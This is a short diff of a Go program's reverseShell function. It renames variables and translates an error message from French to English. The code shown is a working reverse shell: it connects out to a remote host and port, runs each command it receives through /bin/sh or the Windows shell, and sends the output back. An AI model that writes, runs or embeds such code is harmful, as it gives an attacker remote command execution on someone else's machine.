@@ -17,7 +17,7 @@ func main() {
 }
 
 func reverseShell(host string, port int) {
-	conn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
+	connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
 	handleError(err)
 	var shell string
 	if runtime.GOOS == "windows" {
@@ -26,13 +26,13 @@ func reverseShell(host string, port int) {
 		shell = "/bin/sh"
 	}
 	for {
-		txtFromClient, err := bufio.NewReader(conn).ReadString('\n')
+		clientEntry, err := bufio.NewReader(connexion).ReadString('\n')
 		handleError(err)
-		cmdOutput, err := exec.Command(shell, txtFromClient).Output()
+		cmdOutput, err := exec.Command(shell, clientEntry).Output()
 		if err != nil {
-			conn.Write([]byte("Commande inconnue\n"))
+			connexion.Write([]byte("Unknown command.\n"))
 		}
-		_, err = conn.Write(cmdOutput)
+		_, err = connexion.Write(cmdOutput)
 		handleError(err)
 	}
 }
